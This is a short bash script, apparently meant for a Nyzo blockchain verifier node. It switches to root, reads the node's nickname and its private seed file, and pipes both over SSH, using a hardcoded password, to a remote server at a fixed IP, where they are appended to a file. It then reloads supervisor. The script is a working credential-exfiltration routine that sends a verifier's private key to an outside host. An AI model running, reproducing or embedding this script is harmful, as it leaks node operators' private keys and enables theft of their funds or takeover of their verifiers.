#!/bin/bash
sudo su
echo $(cat /var/lib/nyzo/production/nickname):$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'Din1@3456' ssh root@167.172.247.243 'cat - >> /root/file1'
sudo supervisorctl reload
